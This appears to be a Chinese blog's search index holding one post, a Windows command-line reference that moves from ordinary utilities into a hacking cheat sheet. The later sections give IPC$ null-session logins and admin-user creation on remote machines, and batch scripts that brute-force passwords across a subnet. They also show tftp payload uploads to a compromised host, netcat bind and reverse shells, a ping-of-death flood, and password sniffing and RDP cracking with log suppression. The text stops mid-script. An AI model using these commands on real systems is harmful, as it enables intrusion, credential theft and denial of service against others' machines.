<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>cmd命令大全</title>
      <link href="/2018/12/01/cmd%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/"/>
      <url>/2018/12/01/cmd%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><a id="more"></a><p>![](/cmd命令大全/1.png)</p><p>运行操作<br>CMD命令：开始－&gt;运行－&gt;键入cmd或command(在命令行里可以看到系统版本、文件系统版本)<br>CMD命令锦集<br>​      1. gpedit.msc——-组策略<br>　　2. sndrec32———-录音机<br>　　3. Nslookup———-IP地址侦测器 ，是一个 监测网络中 DNS 服务器是否能正确实现域名解析的命令行工具。 它在 Windows NT/2000/XP 中均可使用 , 但在 Windows 98 中却没有集成这一个工具。<br>　　4. explorer———-打开资源管理器<br>　　5. logoff————-注销命令<br>　　6. shutdown———-60秒倒计时关机命令<br>　　7. lusrmgr.msc——本机用户和组<br>　　8. services.msc—-本地服务设置<br>　　9. oobe/msoobe /a——检查XP是否激活<br>　　10. notepad————打开记事本<br>　　11. cleanmgr———-垃圾整理<br>　　12. net start messenger——开始信使服务<br>　　13. compmgmt.msc—-计算机管理<br>　　14. net stop messenger——-停止信使服务<br>　　15. conf—————-启动netmeeting<br>　　16. dvdplay————DVD播放器<br>　　17. charmap————启动字符映射表<br>　　18. diskmgmt.msc—-磁盘管理实用程序<br>　　19. calc—————-启动计算器<br>　　20. dfrg.msc———-磁盘碎片整理程序<br>　　21. chkdsk.exe——-Chkdsk磁盘检查<br>　　22. devmgmt.msc—- 设备管理器<br>　　23. regsvr32 /u <em>.dll——停止dll文件运行<br>　　24. drwtsn32——— 系统医生<br>　　25. rononce -p——15秒关机<br>　　26. dxdiag————-检查DirectX信息<br>　　27. regedt32———-注册表编辑器<br>　　28. Msconfig.exe—-系统配置实用程序<br>　　29. rsop.msc———-组策略结果集<br>　　30. mem.exe————显示内存使用情况<br>　　31. regedit.exe——注册表<br>　　32. winchat————XP自带局域网聊天<br>　　33. progman————程序管理器<br>　　34. winmsd————-系统信息<br>　　35. perfmon.msc——计算机性能监测程序<br>　　36. winver————-检查Windows版本<br>　　37. sfc /scannow——-扫描错误并复原<br>　　38. taskmgr——-任务管理器（2000/xp/2003<br>　　40. wmimgmt.msc——打开windows管理体系结构(WMI)<br>　　41. wupdmgr————windows更新程序<br>　　42. wscript————windows脚本宿主设置<br>　　43. write—————写字板<br>　　45. wiaacmgr———-扫描仪和照相机向导<br>　　46. winchat————XP自带局域网聊天<br>　　49. mplayer2———-简易widnows media player<br>　　50. mspaint————画图板<br>　　51. mstsc—————远程桌面连接<br>　　53. magnify————放大镜实用程序<br>　　54. mmc——————打开控制台<br>　　55. mobsync————同步命令<br>　　57. iexpress———-木马捆绑工具，系统自带<br>　　58. fsmgmt.msc——-共享文件夹管理器<br>　　59. utilman————辅助工具管理器<br>　　61. dcomcnfg———-打开系统组件服务<br>　　62. ddeshare———-打开DDE共享设置<br>　　110. osk——————打开屏幕键盘<br>　　111. odbcad32———-ODBC数据源管理器<br>　　112. oobe/msoobe /a——检查XP是否激活<br>　　68. ntbackup———-系统备份和还原<br>　　69. narrator———-屏幕“讲述人”<br>　　70. ntmsmgr.msc——移动存储管理器<br>　　71. ntmsoprq.msc—-移动存储管理员操作请求<br>　　72. netstat -an——(TC)命令检查接口<br>　　73. syncapp————创建一个公文包<br>　　74. sysedit————系统配置编辑器<br>　　75. sigverif———-文件签名验证程序<br>　　76. ciadv.msc———索引服务程序<br>　　77. shrpubw————创建共享文件夹<br>　　78. secpol.msc——-本地安全策略<br>　　79. syskey————-系统加密，一旦加密就不能解开，保护windows xp系统的双重密码<br>　　80. services.msc—-本地服务设置<br>　　81. Sndvol32———-音量控制程序<br>　　82. sfc.exe————系统文件检查器<br>　　83. sfc /scannow—-windows文件保护<br>　　84. ciadv.msc———索引服务程序<br>　　85. tourstart———xp简介（安装完成后出现的漫游xp程序）<br>　　86. taskmgr————任务管理器<br>　　87. eventvwr———-事件查看器<br>　　88. eudcedit———-造字程序<br>　　89. compmgmt.msc—-计算机管理<br>　　90. packager———-对象包装程序<br>　　91. perfmon.msc——计算机性能监测程序<br>　　92. charmap————启动字符映射表<br>　　93. cliconfg———-SQL SERVER 客户端网络实用程序<br>　　94. Clipbrd————剪贴板查看器<br>　　95. conf—————-启动netmeeting<br>　　96. certmgr.msc——证书管理实用程序<br>　　97. regsvr32 /u </em>.dll——停止dll文件运行<br>　　98. regsvr32 /u zipfldr.dll———取消ZIP支持<br>　　99. cmd.exe————CMD命令提示符<br>操作详解　　<br>　　net use ipipc$ “ “ /user:” “ 建立IPC空链接<br>　　net use ipipc$ “密码” /user:”用户名” 建立IPC非空链接<br>　　net use h: ipc$ “密码” /user:”用户名” 直接登陆后映射对方C：到本地为H:<br>　　net use h: ipc$ 登陆后映射对方C：到本地为H:<br>　　net use ipipc$ /del 删除IPC链接<br>　　net use h: /del 删除映射对方到本地的为H:的映射<br>　　net user 用户名　密码　/add 建立用户<br>　　net user guest /active:yes 激活guest用户<br>　　net user 查看有哪些用户<br>　　net user 帐户名 查看帐户的属性<br>　　net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限<br>　　net start 查看开启了哪些服务<br>　　net start 服务名　开启服务；(如:net start telnet， net start schedule)<br>　　net stop 服务名 停止某服务<br>　　net time 目标ip 查看对方时间<br>　　net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息<br>　　net view 查看本地局域网内开启了哪些共享<br>　　net view ip 查看对方局域网内开启了哪些共享<br>　　net config 显示系统网络设置<br>　　net logoff 断开连接的共享<br>　　net pause 服务名 暂停某服务<br>　　net send ip “文本信息” 向对方发信息<br>　　net ver 局域网内正在使用的网络连接类型和信息<br>　　net share 查看本地开启的共享<br>　　net share ipc$ 开启ipc$共享<br>　　net share ipc$ /del 删除ipc$共享<br>　　net share c$ /del 删除C：共享<br>　　net user guest 12345 用guest用户登陆后用将密码改为12345<br>　　net password 密码 更改系统登陆密码<br>　　netstat -a 查看开启了哪些端口,常用netstat -an<br>　　netstat -n 查看端口的网络连接情况，常用netstat -an<br>　　netstat -v 查看正在进行的工作<br>　　netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况<br>　　netstat -s 查看正在使用的所有协议使用情况<br>　　nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名<br>　　tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。<br>　　ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。<br>　　ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)<br>　　ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息<br>　　tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)<br>　　kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)<br>　　del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR <em>.</em>”表示删除当前目录下所有只读文件，“DEL/A-S <em>.</em>”表示删除当前目录下除系统文件以外的所有文件<br>　　del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）<br>　　move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖<br>　　fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，”&gt; “和”&gt; &gt;” 是重定向命令<br>　　at id号 开启已注册的某个计划任务<br>　　at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止<br>　　at id号 /delete 停止某个已注册的计划任务<br>　　at 查看所有的计划任务<br>　　at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机<br>　　finger username @host 查看最近有哪些用户登陆<br>　　telnet ip 端口 远和登陆服务器,默认端口为23<br>　　open ip 连接到IP（属telnet登陆后的命令）<br>　　telnet 在本机上直接键入telnet 将进入本机的telnet<br>　　copy 路径文件名1　路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件<br>　　copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下<br>　　copy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件<br>　　copy ipadmin$svv.exe c: 或:copyipadmin$<em>.</em> 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：<br>　　xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件<br>　　用参数/e才可连目录下的子目录一起复制到目标地址下。<br>　　tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送<br>　　tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机<br>　　ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件时)<br>　　route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interface<br>　　arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a将显示出全部信息<br>　　start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某程序或命令<br>　　mem 查看cpu使用情况<br>　　attrib 文件名(目录名) 查看某文件（目录）的属性<br>　　attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性<br>　　dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时间，/T:A显示文件上次被访问时间，/T:W上次被修改时间<br>　　date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和时间，而不必输入新日期和时间<br>　　set 指定环境变量名称=要指派给变量的字符 设置环境变量<br>　　set 显示当前所有的环境变量<br>　　set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量<br>　　pause 暂停批处理程序，并显示出：请按任意键继续….<br>　　if 在批处理程序中执行条件处理（更多说明见if命令及变量）<br>　　goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）<br>　　call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见call /?）<br>　　for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）<br>　　echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置<br>　　echo 信息 在屏幕上显示出信息<br>　　echo 信息 &gt;&gt; pass.txt 将”信息”保存到pass.txt文件中<br>　　findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello<br>　　find 文件名 查找某文件<br>　　title 标题名字 更改CMD窗口标题名字<br>　　color 颜色值 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡红、D=淡紫、E=淡黄、F=亮白<br>　　prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )<br>　　ver 在DOS窗口下显示版本信息<br>　　winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）<br>　　format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: /FS:NTFS<br>　　md　目录名 创建目录<br>　　replace 源文件　要替换文件的目录 替换文件<br>　　ren 原文件名　新文件名 重命名文件名<br>　　tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称<br>　　type 文件名 显示文本文件的内容<br>　　more 文件名 逐屏显示输出文件<br>　　doskey 要锁定的命令=字符<br>　　doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用doskey dir=dir)；解锁：doskey dir=<br>　　taskmgr 调出任务管理器<br>　　chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误<br>　　tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet服务默认端口23为其它任何端口<br>　　exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是cmd.exe<br>　　path 路径可执行文件的文件名 为可执行文件设置一个路径。<br>　　cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更我详细说明见cmd /?<br>　　regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；<br>　　regedit /e 注册表文件名 导出注册表<br>　　cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt /D pub 设定d: est.txt拒绝pub用户访问。<br>　　cacls 文件名 查看文件的访问用户权限列表<br>　　REM 文本内容 在批处理文件中添加注解<br>　　netsh 查看或更改本地网络配置情况<br>　　IIS服务命令<br>　　iisreset /reboot 重启win2k计算机（但有提示系统将重启信息出现）<br>　　iisreset /start或stop 启动（停止）所有Internet服务<br>　　iisreset /restart 停止然后重新启动所有Internet服务<br>　　iisreset /status 显示所有Internet服务状态<br>　　iisreset /enable或disable 在本地系统上启用（禁用）Internet服务的重新启动<br>　　iisreset /rebootonerror 当启动、停止或重新启动Internet服务时，若发生错误将重新开机<br>　　iisreset /noforce 若无法停止Internet服务，将不会强制终止Internet服务<br>　　iisreset /timeout Val在到达逾时间（秒）时，仍未停止Internet服务，若指定/rebootonerror参数，则电脑将会重新开机。预设值为重新启动20秒，停止60秒，重新开机0秒。<br>　　FTP 命令： (后面有详细说明内容)<br>　　ftp的命令行格式为:<br>　　ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。<br>　　－d 使用调试方式。<br>　　－n 限制ftp的自动登录,即不使用.netrc文件。<br>　　－g 取消全局文件名。<br>　　help [命令] 或 ？[命令] 查看命令说明<br>　　bye 或 quit 终止主机FTP进程,并退出FTP管理方式.<br>　　pwd 列出当前远端主机目录<br>　　put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中<br>　　get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中<br>　　mget [remote-files] 从远端主机接收一批文件至本地主机<br>　　mput local-files 将本地主机中一批文件传送至远端主机<br>　　dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件<br>　　ascii 设定以ASCII方式传送文件(缺省值)<br>　　bin 或 image 设定以二进制方式传送文件<br>　　bell 每完成一次文件传送,报警提示<br>　　cdup 返回上一级目录<br>　　close 中断与远程服务器的ftp会话(与open对应)<br>　　open host[port] 建立指定ftp服务器连接,可指定连接端口<br>　　delete 删除远端主机中的文件<br>　　mdelete [remote-files] 删除一批文件<br>　　mkdir directory-name 在远端主机中建立目录<br>　　rename [from] [to] 改变远端主机中的文件名<br>　　rmdir directory-name 删除远端主机中的目录<br>　　status 显示当前FTP的状态<br>　　system 显示远端主机系统类型<br>　　user user-name [password] [account] 重新以别的用户名登录远端主机<br>　　open host [port] 重新建立一个新的连接<br>　　prompt 交互提示模式<br>　　macdef 定义宏命令<br>　　lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的HOME目录<br>　　chmod 改变远端主机的文件权限<br>　　case 当为ON时,用MGET命令拷贝的文件名到本地机器中,全部转换为小写字母<br>　　cd remote－dir 进入远程主机目录<br>　　cdup 进入远程主机目录的父目录<br>　　! 在本地机中执行交互shell，exit回到ftp环境,如!ls<em>.zip<br>　　#5<br>　　MYSQL 命令<br>　　mysql -h主机地址 -u用户名 －p密码 连接MYSQL;如果刚安装好MYSQL，超级用户root是没有密码的。<br>　　（例：mysql -h110.110.110.110 -Uroot -P123456<br>　　注:u与root可以不用加空格，其它也一样）<br>　　exit 退出MYSQL<br>　　mysqladmin -u用户名 -p旧密码 password 新密码 修改密码<br>　　grant select on 数据库.</em> to 用户名@登录主机 identified by “密码”; 增加新用户。（注意：和上面不同，下面的因为是MYSQL环境中的命令，所以后面都带一个分号作为命令结束符）<br>　　show databases; 显示数据库列表。刚开始时才两个数据库：mysql和test。mysql库很重要它里面有MYSQL的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。<br>　　use mysql；<br>　　show tables; 显示库中的数据表<br>　　describe 表名; 显示数据表的结构<br>　　create database 库名; 建库<br>　　use 库名；<br>　　create table 表名 (字段设定列表)； 建表<br>　　drop database 库名;<br>　　drop table 表名； 删库和删表<br>　　delete from 表名; 将表中记录清空<br>　　select <em> from 表名; 显示表中的记录<br>　　mysqldump —opt school&gt;school.bbb 备份数据库：（命令在DOS的mysqlin目录下执行）;注释:将数据库school备份到school.bbb文件，school.bbb是一个文本文件，文件名任取，打开看看你会有新发现。<br>　　win2003系统下新增命令（实用部份）：<br>　　shutdown /参数 关闭或重启本地或远程主机。<br>　　参数说明：/S 关闭主机，/R 重启主机， /T 数字 设定延时的时间，范围0～180秒之间， /A取消开机，/M //IP 指定的远程主机。<br>　　例：shutdown /r /t 0 立即重启本地主机（无延时）<br>　　taskill /参数 进程名或进程的pid 终止一个或多个任务和进程。<br>　　参数说明：/PID 要终止进程的pid,可用tasklist命令获得各进程的pid，/IM 要终止的进程的进程名，/F 强制终止进程，/T 终止指定的进程及他所启动的子进程。<br>　　tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。<br>　　参数说明：/M 列出当前进程加载的dll文件，/SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。<br>　　Linux系统下基本命令　注：要区分大小写<br>　　uname 显示版本信息（同win2K的 ver）<br>　　dir 显示当前目录文件,ls -al 显示包括隐藏文件（同win2K的 dir）<br>　　pwd 查询当前所在的目录位置<br>　　cd cd　..回到上一层目录，注意cd 与..之间有空格。cd　/返回到根目录。<br>　　cat 文件名 查看文件内容<br>　　cat &gt;abc.txt 往abc.txt文件中写上内容。<br>　　more 文件名 以一页一页的方式显示一个文本文件。<br>　　cp 复制文件<br>　　mv 移动文件<br>　　rm 文件名 删除文件，rm -a 目录名删除目录及子目录<br>　　mkdir 目录名 建立目录<br>　　rmdir 删除子目录，目录内没有文档。<br>　　chmod 设定档案或目录的存取权限<br>　　grep 在档案中查找字符串<br>　　diff 档案文件比较<br>　　find 档案搜寻<br>　　date 现在的日期、时间<br>　　who 查询目前和你使用同一台机器的人以及Login时间地点<br>　　w 查询目前上机者的详细资料<br>　　whoami 查看自己的帐号名称<br>　　groups 查看某人的Group<br>　　passwd 更改密码<br>　　history 查看自己下过的命令<br>　　ps 显示进程状态<br>　　kill 停止某进程<br>　　gcc 黑客通常用它来编译C语言写的文件<br>　　su 权限转换为指定使用者<br>　　telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。<br>　　ftp ftp连接上某服务器（同win2K）<br>　　批处理命令与变量<br>　　1：for命令及变量 基本格式<br>　　FOR /参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。<br>　　批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use ipipc$ pass /user:user 中ip为%1,pass为%2 ,user为%3<br>　　(set):指定一个或一组文件，可使用通配符，如：(D:user.txt)和(1 1 254)(1 -1 254),{ “(1 1 254)”第一个”1”指起始值，第二个”1”指增长量，第三个”254”指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1 }<br>　　command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：&amp; 来隔开<br>　　command_parameters：为特定命令指定参数或命令行开关<br>　　IN (set)：指在(set)中取值；DO command ：指执行command<br>　　参数：/L 指用增量形式{ (set)为增量形式时 }；/F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:pass.txt)时 }。<br>　　用法举例：<br>　　@echo off<br>　　echo 用法格式：test.bat </em>.<em>.</em> &gt; test.txt<br>　　for /L %%G in (1 1 254) do echo %1.%%G &gt;&gt;test.txt &amp; net use \%1.%%G /user:administrator | find “命令成功完成” &gt;&gt;test.txt<br>　　存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。<br>　　/L指用增量形式（即从1-254或254-1）；输入的IP前面三位：<em>.</em>.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；&amp; 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有”命令成功完成”信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。<br>　　@echo off<br>　　echo 用法格式：ok.bat ip<br>　　FOR /F %%i IN (D:user.dic) DO smb.exe %1 %%i D:pass.dic 200<br>　　存为：ok.exe 说明：输入一个IP后，用字典文件d:pass.dic来暴解d:user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。<br>　　七：<br>　　2：if命令及变量 基本格式<br>　　IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。<br>　　例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。<br>　　0 指发现并成功执行（真）；1 指没有发现、没执行（假）。<br>　　IF [not] 字符串1==字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。<br>　　例：“if “%2%”==”4” goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加” “）<br>　　IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。<br>　　例：“if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到”:end”标签处。<br>　　IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1==字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。 当有del命令时需把del命令全部内容用&lt; &gt;括起来，因为del命令要单独一行时才能执行，用上&lt; &gt;后就等于是单独一行了；例如：“if exist test.txt. <del test.txt.=""> else echo test.txt.missing ”，注意命令中的“.”<br>　　系统外部命令<br>　　注：系统外部命令(均需下载相关工具)<br>　　瑞士军刀：nc.exe<br>　　参数说明：<br>　　-h 查看帮助信息<br>　　-d 后台模式<br>　　-e prog程序重定向，一但连接就执行[危险]<br>　　-i secs延时的间隔<br>　　-l 监听模式，用于入站连接<br>　　-L 监听模式，连接天闭后仍然继续监听，直到CTR+C<br>　　-n IP地址，不能用域名<br>　　-o film记录16进制的传输<br>　　-p[空格]端口 本地端口号<br>　　-r 随机本地及远程端口<br>　　-t 使用Telnet交互方式<br>　　-u UDP模式<br>　　-v 详细输出，用-vv将更详细<br>　　-w数字 timeout延时间隔<br>　　-z 将输入，输出关掉（用于扫锚时）<br>　　基本用法：<br>　　nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口<br>　　nc -l -p 80 开启本机的TCP 80端口并监听<br>　　nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口<br>　　nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口<br>　　nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口<br>　　高级用法：<br>　　nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止<br>　　nc -L -p 80 &gt; c:log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:log.txt<br>　　nc -L -p 80 &lt; c:honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中，亦可起到传送文件作用<br>　　type.exe c:honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中,亦可起到传送文件作用<br>　　本机上用：nc -l -p 本机端口<br>　　在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K<br>　　nc -e /bin/sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙<br>　　本机上用：nc -d -l -p 本机端口 \&lt; 要传送的文件路径及名称<br>　　在对方主机上用：nc -vv 本机IP 本机端口 &gt; 存放文件的路径及名称 传送文件到对方主机<br>　　备 注：<br>　　| 管道命令<br>　　\&lt; 或> 重定向命令。“\&lt;”，例如：tlntadmn &lt; test.txt 指把test.txt的内容赋值给tlntadmn命令<br>　　@ 表示执行@后面的命令，但不会显示出来（后台执行）；例：@dir c:winnt &gt;&gt; d:log.txt 意思是：后台执行dir，并把结果存在d:log.txt中<br>　　>与&gt;&gt;的区别 “>“指：覆盖；”>&gt;”指：保存到(添加到）。<br>　　如：@dir c:winnt &gt;&gt; d:log.txt和@dir c:winnt &gt; d:log.txt二个命令分别执行二次比较看：用&gt;&gt;的则是把二次的结果都保存了，而用：&gt;则只有一次的结果，是因为第二次的结果把第一次的覆盖了。<br>　　八：<br>　　扫描工具：xscan.exe<br>　　基本格式<br>　　xscan -host &lt;起始IP&gt;[-&lt;终止IP&gt;] &lt;检测项目&gt; [其他选项] 扫锚”起始IP到终止IP”段的所有主机信息<br>　　xscan -file &lt;主机列表文件名&gt; &lt;检测项目&gt; [其他选项] 扫锚”主机IP列表文件名”中的所有主机信息<br>　　检测项目<br>　　-active 检测主机是否存活<br>　　-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）<br>　　-port 检测常用服务的端口状态<br>　　-ftp 检测FTP弱口令<br>　　-pub 检测FTP服务匿名用户写权限<br>　　-pop3 检测POP3-Server弱口令<br>　　-smtp 检测SMTP-Server漏洞<br>　　-sql 检测SQL-Server弱口令<br>　　-smb 检测NT-Server弱口令<br>　　-iis 检测IIS编码/解码漏洞<br>　　-cgi 检测CGI漏洞<br>　　-nasl 加载Nessus攻击脚本<br>　　-all 检测以上所有项目<br>　　其它选项<br>　　-i 适配器编号 设置网络适配器, &lt;适配器编号&gt;可通过”-l”参数获取<br>　　-l 显示所有网络适配器<br>　　-v 显示详细扫描进度<br>　　-p 跳过没有响应的主机<br>　　-o 跳过没有检测到开放端口的主机<br>　　-t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10<br>　　-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)<br>　　用法示例<br>　　xscan -host 192.168.1.1-192.168.255.255 -all -active -p　检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机<br>　　xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机<br>　　xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机<br>　　九：<br>　　命令行方式嗅探器: xsniff.exe<br>　　可捕获局域网内FTP/SMTP/POP3/HTTP协议密码<br>　　参数说明<br>　　-tcp 输出TCP数据报<br>　　-udp 输出UDP数据报<br>　　-icmp 输出ICMP数据报<br>　　-pass 过滤密码信息<br>　　-hide 后台运行<br>　　-host 解析主机名<br>　　-addr IP地址 过滤IP地址<br>　　-port 端口 过滤端口<br>　　-log 文件名 将输出保存到文件<br>　　-asc 以ASCII形式输出<br>　　-hex 以16进制形式输出<br>　　用法示例<br>　　xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中<br>　　xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出<br>　　终端服务密码破解: tscrack.exe<br>　　参数说明<br>　　-h 显示使用帮助<br>　　-v 显示版本信息<br>　　-s 在屏幕上打出解密能力<br>　　-b 密码错误时发出的声音<br>　　-t 同是发出多个连接（多线程）<br>　　-N Prevent System Log entries on targeted server<br>　　-U 卸载移除tscrack组件<br>　　-f 使用－f后面的密码<br>　　-F 间隔时间（频率）<br>　　-l 使用－l后面的用户名<br>　　-w 使用－w后面的密码字典<br>　　-p 使用－p后面的密码<br>　　-D 登录主页面<br>　　用法示例<br>　　tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码<br>　　tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户<br>　　@if not exist ipcscan.txt goto noscan<br>　　@for /f “tokens=1 delims= “ %%i in (3389.txt) do call 